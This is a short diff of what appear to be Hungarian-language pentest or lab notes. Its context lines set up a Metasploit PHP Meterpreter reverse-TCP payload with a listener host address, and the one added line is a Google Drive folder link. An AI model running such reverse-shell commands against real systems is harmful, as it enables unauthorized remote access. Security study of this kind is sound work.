@@ -79,3 +79,5 @@ msfconsole
 	set payload php/meterpreter/reverse_tcp set lhost 30.0.1.14
 	run
 utána exit
+
+https://drive.google.com/drive/folders/1pAPH6c5MFAJhJIpG6w88XulvNG5qrfBm
